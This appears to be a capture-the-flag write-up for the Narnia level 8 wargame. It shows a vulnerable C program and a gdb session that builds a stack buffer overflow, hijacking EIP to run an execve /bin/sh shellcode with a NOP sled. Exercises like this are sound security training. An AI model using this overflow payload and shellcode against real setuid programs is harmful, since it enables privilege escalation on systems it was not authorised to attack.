============== Source ==========================================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am 
// making "i" global unti i find a fix 
// -morla 
int i; 

void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;
	
	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];

	printf("%s\n",bok);
}

int main(int argc, char **argv){
        
	if(argc > 1)       
		func(argv[1]);
	else    
	printf("%s argument\n", argv[0]);

	return 0;
}
==================================================================
Im gonna try some stuff, see what falls out of the tree

narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A"*18')
AAAAAAAAAAAAAAAAAA
narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A"*19')
AAAAAAAAAAAAAAAAAAA
narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A"*20')
AAAAAAAAAAAAAAAAAAAA����
narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A"*25')
AAAAAAAAAAAAAAAAAAAAA���

hmmmm let's GDB this mess
==================================================================
0x080484a7 is location of print in func()

(gdb) b *0x080484a7
Breakpoint 2 at 0x80484a7
(gdb) r $(python -c 'print "A"*20')
Starting program: /narnia/narnia8 $(python -c 'print "A"*20')

Breakpoint 2, 0x080484a7 in func ()
(gdb) x/100x $esp
0xffffd6c0:	0x08048580	0xffffd6d8	0x00000014	0xf7e55fe3
0xffffd6d0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0xffffd8e3
0xffffd6f0:	0x00000002	0xffffd7b4	0xffffd718	0x080484cd
0xffffd700:	0xffffd8e3	0xf7ffd000	0x080484fb	0xf7fcc000
0xffffd710:	0x080484f0	0x00000000	0x00000000	0xf7e3cad3
0xffffd720:	0x00000002	0xffffd7b4	0xffffd7c0	0xf7feacca
0xffffd730:	0x00000002	0xffffd7b4	0xffffd754	0x080497a4
0xffffd740:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
0xffffd750:	0x00000000	0x06e966f9	0x3ed202e9	0x00000000
0xffffd760:	0x00000000	0x00000000	0x00000002	0x08048330
0xffffd770:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
0xffffd780:	0x00000002	0x08048330	0x00000000	0x08048351
0xffffd790:	0x080484ae	0x00000002	0xffffd7b4	0x080484f0
0xffffd7a0:	0x08048560	0xf7feb160	0xffffd7ac	0x0000001c
0xffffd7b0:	0x00000002	0xffffd8d3	0xffffd8e3	0x00000000
0xffffd7c0:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
0xffffd7d0:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
0xffffd7e0:	0xffffde90	0xffffde9c	0xffffdefa	0xffffdf11
0xffffd7f0:	0xffffdf20	0xffffdf32	0xffffdf43	0xffffdf4c
0xffffd800:	0xffffdf5f	0xffffdf67	0xffffdf77	0xffffdfa6
0xffffd810:	0xffffdfc6	0x00000000	0x00000020	0xf7fdbbe0
0xffffd820:	0x00000021	0xf7fdb000	0x00000010	0x178bfbff
0xffffd830:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd840:	0x00000003	0x08048034	0x00000004	0x00000020

(gdb) r $(python -c 'print "A"*25')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
yStarting program: /narnia/narnia8 $(python -c 'print "A"*25')

Breakpoint 2, 0x080484a7 in func ()
(gdb) x/100x $esp
0xffffd6b0:	0x08048580	0xffffd6c8	0x00000014	0xf7e55fe3
0xffffd6c0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0xffffd841
0xffffd6e0:	0x00000002	0xffffd7a4	0xffffd708	0x080484cd
0xffffd6f0:	0xffffd8de	0xf7ffd000	0x080484fb	0xf7fcc000
0xffffd700:	0x080484f0	0x00000000	0x00000000	0xf7e3cad3
0xffffd710:	0x00000002	0xffffd7a4	0xffffd7b0	0xf7feacca
0xffffd720:	0x00000002	0xffffd7a4	0xffffd744	0x080497a4
0xffffd730:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
0xffffd740:	0x00000000	0xe61fb6f7	0xde24b2e7	0x00000000
0xffffd750:	0x00000000	0x00000000	0x00000002	0x08048330
0xffffd760:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
0xffffd770:	0x00000002	0x08048330	0x00000000	0x08048351
0xffffd780:	0x080484ae	0x00000002	0xffffd7a4	0x080484f0
0xffffd790:	0x08048560	0xf7feb160	0xffffd79c	0x0000001c
0xffffd7a0:	0x00000002	0xffffd8ce	0xffffd8de	0x00000000
0xffffd7b0:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
0xffffd7c0:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
0xffffd7d0:	0xffffde90	0xffffde9c	0xffffdefa	0xffffdf11
0xffffd7e0:	0xffffdf20	0xffffdf32	0xffffdf43	0xffffdf4c
0xffffd7f0:	0xffffdf5f	0xffffdf67	0xffffdf77	0xffffdfa6
0xffffd800:	0xffffdfc6	0x00000000	0x00000020	0xf7fdbbe0
0xffffd810:	0x00000021	0xf7fdb000	0x00000010	0x178bfbff
0xffffd820:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd830:	0x00000003	0x08048034	0x00000004	0x00000020

hmmm....
So we can overflow one byte at 0xffffd6dc... I wonder what I can do with this...

(gdb) r $(python -c 'print "A" *20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print "A" *20')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/160x $esp
0xffffd6c0:	0x08048580	0xffffd6d8	0x00000014	0xf7e55fe3
0xffffd6d0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0xffffd8e3
0xffffd6f0:	0x00000002	0xffffd7b4	0xffffd718	0x080484cd
0xffffd700:	0xffffd8e3	0xf7ffd000	0x080484fb	0xf7fcc000
0xffffd710:	0x080484f0	0x00000000	0x00000000	0xf7e3cad3
0xffffd720:	0x00000002	0xffffd7b4	0xffffd7c0	0xf7feacca
0xffffd730:	0x00000002	0xffffd7b4	0xffffd754	0x080497a4
0xffffd740:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
0xffffd750:	0x00000000	0xab83c882	0x93b8ac92	0x00000000
0xffffd760:	0x00000000	0x00000000	0x00000002	0x08048330
0xffffd770:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
0xffffd780:	0x00000002	0x08048330	0x00000000	0x08048351
0xffffd790:	0x080484ae	0x00000002	0xffffd7b4	0x080484f0
0xffffd7a0:	0x08048560	0xf7feb160	0xffffd7ac	0x0000001c
0xffffd7b0:	0x00000002	0xffffd8d3	0xffffd8e3	0x00000000
0xffffd7c0:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
0xffffd7d0:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
0xffffd7e0:	0xffffde90	0xffffde9c	0xffffdefa	0xffffdf11
0xffffd7f0:	0xffffdf20	0xffffdf32	0xffffdf43	0xffffdf4c
0xffffd800:	0xffffdf5f	0xffffdf67	0xffffdf77	0xffffdfa6
0xffffd810:	0xffffdfc6	0x00000000	0x00000020	0xf7fdbbe0
0xffffd820:	0x00000021	0xf7fdb000	0x00000010	0x178bfbff
0xffffd830:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd840:	0x00000003	0x08048034	0x00000004	0x00000020
0xffffd850:	0x00000005	0x00000008	0x00000007	0xf7fdc000
0xffffd860:	0x00000008	0x00000000	0x00000009	0x08048330
0xffffd870:	0x0000000b	0x000036b8	0x0000000c	0x000036b8
0xffffd880:	0x0000000d	0x000036b8	0x0000000e	0x000036b8
0xffffd890:	0x00000017	0x00000000	0x00000019	0xffffd8bb
0xffffd8a0:	0x0000001f	0xffffdfe8	0x0000000f	0xffffd8cb
0xffffd8b0:	0x00000000	0x00000000	0x38000000	0xc452a49c
0xffffd8c0:	0x71beaa16	0x1d8352e4	0x69f69369	0x00363836
0xffffd8d0:	0x2f000000	0x6e72616e	0x6e2f6169	0x696e7261
0xffffd8e0:	0x41003861	0x41414141	0x41414141	0x41414141
0xffffd8f0:	0x41414141	0x00414141	0x4c454853	0x622f3d4c
0xffffd900:	0x622f6e69	0x00687361	0x4d524554	0x6574783d
0xffffd910:	0x322d6d72	0x6f633635	0x00726f6c	0x5f485353
0xffffd920:	0x45494c43	0x313d544e	0x312e3237	0x2e302e38
0xffffd930:	0x34332031	0x20303133	0x53003232	0x545f4853

Ok so *0xffffd6ec is 0xffffd8e3, which is the address of the As in the previous stack frame... interesting

=================== SEG FAULT?!? =============================================
With a bit more fiddling around I managed to break this damn thing like so:

(gdb) r $(python -c 'print "A" *20 +"B"*100')
Starting program: /narnia/narnia8 $(python -c 'print "A" *20 +"B"*100')
Program received signal SIGSEGV, Segmentation fault.
0x08048492 in func ()

After a bit more tumbles, the magic payload is:

(gdb) r $(python -c 'print "A" *20 +"B"*68')
Starting program: /narnia/narnia8 $(python -c 'print "A" *20 +"B"*68')
Program received signal SIGSEGV, Segmentation fault.
0x08048492 in func ()

Let's take a look at what's at 0x08048492
(gdb) disas func
Dump of assembler code for function func:
   0x0804842d <+0>:	push   ebp
   0x0804842e <+1>:	mov    ebp,esp
   0x08048430 <+3>:	sub    esp,0x38
   0x08048433 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048436 <+9>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048439 <+12>:	mov    DWORD PTR [esp+0x8],0x14
   0x08048441 <+20>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048449 <+28>:	lea    eax,[ebp-0x20]
   0x0804844c <+31>:	mov    DWORD PTR [esp],eax
   0x0804844f <+34>:	call   0x8048320 <memset@plt>
   0x08048454 <+39>:	mov    DWORD PTR ds:0x80497b8,0x0
   0x0804845e <+49>:	jmp    0x8048486 <func+89>
   0x08048460 <+51>:	mov    eax,ds:0x80497b8
   0x08048465 <+56>:	mov    edx,DWORD PTR ds:0x80497b8
   0x0804846b <+62>:	mov    ecx,edx
   0x0804846d <+64>:	mov    edx,DWORD PTR [ebp-0xc]
   0x08048470 <+67>:	add    edx,ecx
   0x08048472 <+69>:	movzx  edx,BYTE PTR [edx]
   0x08048475 <+72>:	mov    BYTE PTR [ebp+eax*1-0x20],dl
   0x08048479 <+76>:	mov    eax,ds:0x80497b8
   0x0804847e <+81>:	add    eax,0x1
   0x08048481 <+84>:	mov    ds:0x80497b8,eax
   0x08048486 <+89>:	mov    eax,ds:0x80497b8
   0x0804848b <+94>:	mov    edx,eax
   0x0804848d <+96>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048490 <+99>:	add    eax,edx
=> 0x08048492 <+101>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+104>:	test   al,al
   0x08048497 <+106>:	jne    0x8048460 <func+51>
   0x08048499 <+108>:	lea    eax,[ebp-0x20]
   0x0804849c <+111>:	mov    DWORD PTR [esp+0x4],eax
   0x080484a0 <+115>:	mov    DWORD PTR [esp],0x8048580
   0x080484a7 <+122>:	call   0x80482f0 <printf@plt>
   0x080484ac <+127>:	leave  
   0x080484ad <+128>:	ret    
End of assembler dump.

Hmmmm, we're SEGFAULTing in the for loop, there's gotta be something about messy about "bok[i]=blah[i];"
Let's see what happens after bok[] is "full"

(gdb) r $(python -c 'print "A" *20 +"B"*68')
Starting program: /narnia/narnia8 $(python -c 'print "A" *20 +"B"*68')
Breakpoint 2, 0x08048492 in func ()
## Did a bunch of continues to fill up das buffer
(gdb) x/200x $esp
0xffffd670:	0xffffd688	0x00000000	0x00000014	0xf7e55fe3
0xffffd680:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0xffffd89f
0xffffd6a0:	0x00000002	0xffffd764	0xffffd6c8	0x080484cd
-- redacted
0xffffd870:	0x1ea7400d	0xe0ceca15	0x693ec03c	0x00363836
0xffffd880:	0x00000000	0x00000000	0x00000000	0x2f000000
0xffffd890:	0x6e72616e	0x6e2f6169	0x696e7261	0x41003861
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x42414141	0x42424242	0x42424242	0x42424242
0xffffd8c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8e0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8f0:	0x42424242	0x00424242	0x4c454853	0x622f3d4c
0xffffd900:	0x622f6e69	0x00687361	0x4d524554	0x6574783d
0xffffd910:	0x322d6d72	0x6f633635	0x00726f6c	0x5f485353
0xffffd920:	0x45494c43	0x313d544e	0x312e3237	0x2e302e38
0xffffd930:	0x34332031	0x20303133	0x53003232	0x545f4853
0xffffd940:	0x2f3d5954	0x2f766564	0x2f737470	0x434c0030
0xffffd950:	0x4c4c415f	0x5500433d	0x3d524553	0x6e72616e
0xffffd960:	0x00386169	0x435f534c	0x524f4c4f	0x73723d53
0xffffd970:	0x643a303d	0x31303d69	0x3a34333b	0x303d6e6c
0xffffd980:	0x36333b31	0x3d686d3a	0x703a3030	0x30343d69
(gdb) c
Continuing.
## Right now *0xffffd69f still points to the correct place (0xffffd89f)
Breakpoint 2, 0x08048492 in func ()
(gdb) x/200x $esp
0xffffd670:	0xffffd688	0x00000000	0x00000014	0xf7e55fe3
0xffffd680:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0xffffd842
0xffffd6a0:	0x00000002	0xffffd764	0xffffd6c8	0x080484cd
-- redacted
0xffffd870:	0x1ea7400d	0xe0ceca15	0x693ec03c	0x00363836
0xffffd880:	0x00000000	0x00000000	0x00000000	0x2f000000
0xffffd890:	0x6e72616e	0x6e2f6169	0x696e7261	0x41003861
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x42414141	0x42424242	0x42424242	0x42424242
0xffffd8c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8e0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8f0:	0x42424242	0x00424242	0x4c454853	0x622f3d4c
0xffffd900:	0x622f6e69	0x00687361	0x4d524554	0x6574783d
0xffffd910:	0x322d6d72	0x6f633635	0x00726f6c	0x5f485353
0xffffd920:	0x45494c43	0x313d544e	0x312e3237	0x2e302e38
0xffffd930:	0x34332031	0x20303133	0x53003232	0x545f4853
0xffffd940:	0x2f3d5954	0x2f766564	0x2f737470	0x434c0030
0xffffd950:	0x4c4c415f	0x5500433d	0x3d524553	0x6e72616e
0xffffd960:	0x00386169	0x435f534c	0x524f4c4f	0x73723d53
0xffffd970:	0x643a303d	0x31303d69	0x3a34333b	0x303d6e6c
0xffffd980:	0x36333b31	0x3d686d3a	0x703a3030	0x30343d69
(gdb) c
Continuing.
## Now *0xffffd69f has its last byte overwritten by B
Breakpoint 2, 0x08048492 in func ()
(gdb) x/200x $esp
0xffffd670:	0xffffd688	0x00000000	0x00000014	0xf7e55fe3
0xffffd680:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0xffffff42
0xffffd6a0:	0x00000002	0xffffd764	0xffffd6c8	0x080484cd
-- redacted
0xffffd870:	0x1ea7400d	0xe0ceca15	0x693ec03c	0x00363836
0xffffd880:	0x00000000	0x00000000	0x00000000	0x2f000000
0xffffd890:	0x6e72616e	0x6e2f6169	0x696e7261	0x41003861
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x42414141	0x42424242	0x42424242	0x42424242
0xffffd8c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8e0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8f0:	0x42424242	0x00424242	0x4c454853	0x622f3d4c
0xffffd900:	0x622f6e69	0x00687361	0x4d524554	0x6574783d
0xffffd910:	0x322d6d72	0x6f633635	0x00726f6c	0x5f485353
0xffffd920:	0x45494c43	0x313d544e	0x312e3237	0x2e302e38
0xffffd930:	0x34332031	0x20303133	0x53003232	0x545f4853
0xffffd940:	0x2f3d5954	0x2f766564	0x2f737470	0x434c0030
0xffffd950:	0x4c4c415f	0x5500433d	0x3d524553	0x6e72616e
0xffffd960:	0x00386169	0x435f534c	0x524f4c4f	0x73723d53
0xffffd970:	0x643a303d	0x31303d69	0x3a34333b	0x303d6e6c
0xffffd980:	0x36333b31	0x3d686d3a	0x703a3030	0x30343d69
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08048492 in func ()
## Now *0xffffd69f is somehow 0xffffff42 ?!?!? wat? where did that value come from?

============ Gonna try to play with that 0xffffff42 ==================================
I'm going to try to keep the address pointing to the place it was before crashing, in this case 0xffffd89f

(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*64')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*64')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/200x $esp
0xffffd670:	0x08048580	0xffffd688	0x00000014	0xf7e55fe3
0xffffd680:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0xffffd89f
0xffffd6a0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd6b0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd6c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd6d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd6e0:	0x00000002	0xffffd764	0xffffd704	0x080497a4
0xffffd6f0:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
0xffffd700:	0x00000000	0x9703d45b	0xaf3b504b	0x00000000
-- redacted
0xffffd880:	0x00000000	0x00000000	0x00000000	0x2f000000
0xffffd890:	0x6e72616e	0x6e2f6169	0x696e7261	0x41003861
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x9f414141	0x42ffffd8	0x42424242	0x42424242
0xffffd8c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8e0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd8f0:	0x42424242	0x00424242	0x4c454853	0x622f3d4c
0xffffd900:	0x622f6e69	0x00687361	0x4d524554	0x6574783d
0xffffd910:	0x322d6d72	0x6f633635	0x00726f6c	0x5f485353
0xffffd920:	0x45494c43	0x313d544e	0x312e3237	0x2e302e38
0xffffd930:	0x30352031	0x20303737	0x53003232	0x545f4853
0xffffd940:	0x2f3d5954	0x2f766564	0x2f737470	0x434c0030
0xffffd950:	0x4c4c415f	0x5500433d	0x3d524553	0x6e72616e
0xffffd960:	0x00386169	0x435f534c	0x524f4c4f	0x73723d53
0xffffd970:	0x643a303d	0x31303d69	0x3a34333b	0x303d6e6c
0xffffd980:	0x36333b31	0x3d686d3a	0x703a3030	0x30343d69
(gdb) si
0x080482f0 in printf@plt ()
(gdb) finish
Run till exit from #0  0x080482f6 in printf@plt ()
AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
0x080484ac in func ()
(gdb) disas func
Dump of assembler code for function func:
   0x0804842d <+0>:	push   ebp
   0x0804842e <+1>:	mov    ebp,esp
   0x08048430 <+3>:	sub    esp,0x38
   0x08048433 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048436 <+9>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048439 <+12>:	mov    DWORD PTR [esp+0x8],0x14
   0x08048441 <+20>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048449 <+28>:	lea    eax,[ebp-0x20]
   0x0804844c <+31>:	mov    DWORD PTR [esp],eax
   0x0804844f <+34>:	call   0x8048320 <memset@plt>
   0x08048454 <+39>:	mov    DWORD PTR ds:0x80497b8,0x0
   0x0804845e <+49>:	jmp    0x8048486 <func+89>
   0x08048460 <+51>:	mov    eax,ds:0x80497b8
   0x08048465 <+56>:	mov    edx,DWORD PTR ds:0x80497b8
   0x0804846b <+62>:	mov    ecx,edx
   0x0804846d <+64>:	mov    edx,DWORD PTR [ebp-0xc]
   0x08048470 <+67>:	add    edx,ecx
   0x08048472 <+69>:	movzx  edx,BYTE PTR [edx]
   0x08048475 <+72>:	mov    BYTE PTR [ebp+eax*1-0x20],dl
   0x08048479 <+76>:	mov    eax,ds:0x80497b8
   0x0804847e <+81>:	add    eax,0x1
   0x08048481 <+84>:	mov    ds:0x80497b8,eax
   0x08048486 <+89>:	mov    eax,ds:0x80497b8
   0x0804848b <+94>:	mov    edx,eax
   0x0804848d <+96>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048490 <+99>:	add    eax,edx
   0x08048492 <+101>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+104>:	test   al,al
   0x08048497 <+106>:	jne    0x8048460 <func+51>
   0x08048499 <+108>:	lea    eax,[ebp-0x20]
   0x0804849c <+111>:	mov    DWORD PTR [esp+0x4],eax
   0x080484a0 <+115>:	mov    DWORD PTR [esp],0x8048580
   0x080484a7 <+122>:	call   0x80482f0 <printf@plt>
=> 0x080484ac <+127>:	leave  
   0x080484ad <+128>:	ret    
End of assembler dump.
(gdb) si
0x080484ad in func ()
(gdb) si
0x42424242 in ?? ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

SWEEEEEEEEEEEET now we can use this to plop a payload in there

=============================================================================
I grabbed the payload from narnia4, 25 bytes long, found the loaction of the highjacked eip (4*Cs), added the nop sled

(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"CCCC"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"CCCC"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBBCCCC�����������������������1�Ph//shh/bin��PS���°
                                                                                    

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"CCCC"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"CCCC"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/100x $esp
0xffffd670:	0x08048580	0xffffd688	0x00000014	0xf7e55fe3
0xffffd680:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0xffffd89f
0xffffd6a0:	0x42424242	0x42424242	0x42424242	0x43434343
0xffffd6b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6c0:	0x90909090	0x31909090	0x2f6850c0	0x6868732f
0xffffd6d0:	0x6e69622f	0x5350e389	0xc289e189	0x80cd0bb0
0xffffd6e0:	0x00000002	0xffffd764	0xffffd704	0x080497a4
0xffffd6f0:	0x0804820c	0xf7fcc000	0x00000000	0x00000000
0xffffd700:	0x00000000	0xea03394b	0xd23bbd5b	0x00000000
0xffffd710:	0x00000000	0x00000000	0x00000002	0x08048330
0xffffd720:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
0xffffd730:	0x00000002	0x08048330	0x00000000	0x08048351
0xffffd740:	0x080484ae	0x00000002	0xffffd764	0x080484f0
0xffffd750:	0x08048560	0xf7feb160	0xffffd75c	0x0000001c
0xffffd760:	0x00000002	0xffffd88f	0xffffd89f	0x00000000
0xffffd770:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
0xffffd780:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
0xffffd790:	0xffffde90	0xffffde9c	0xffffdefa	0xffffdf11
0xffffd7a0:	0xffffdf20	0xffffdf32	0xffffdf43	0xffffdf4c
0xffffd7b0:	0xffffdf5f	0xffffdf67	0xffffdf77	0xffffdfa6
0xffffd7c0:	0xffffdfc6	0x00000000	0x00000020	0xf7fdbbe0
0xffffd7d0:	0x00000021	0xf7fdb000	0x00000010	0x178bfbff
0xffffd7e0:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd7f0:	0x00000003	0x08048034	0x00000004	0x00000020
(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"\xb0\xd6\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"\xb0\xd6\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBB���������������������������1�Ph//shh/bin��PS���°
                                                                                    
process 494 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80484a7

hmmmm, whacky.... Let's try without breakpoint 1

(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"\xb0\xd6\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"\xb0\xd6\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBB���������������������������1�Ph//shh/bin��PS���°
                                                                                    
process 134 is executing new program: /bin/dash
$ whoami
narnia8

Check it out!! Now all I have to do is change the address "\x9f\xd8\xff\xff", and possibly "\xb0\xd6\xff\xff" to make this shit work outside of gdb

============== Dealing with GDB vs not dealing with GDB stack addresses ======================
I read somewhere that some of the discrepencies between in gdb and out of gdb stack addresses comes from the env.
Using env -, which is the same as env -i used to remove env from whatever follows, I should be able to isolate and remove the new variables 

narnia8@narnia:~$ env - gdb /narnia/narnia8
(gdb) show env
LINES=62
COLUMNS=204
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env 

So by using this sequence I should be able to get the right addresses for my stack. 
Now, in a new gdb session WITH the env included:

narnia8@narnia:~$ gdb /narnia/narnia8
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=172.18.0.1 54926 22
SSH_TTY=/dev/pts/0
LC_ALL=C
USER=narnia8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.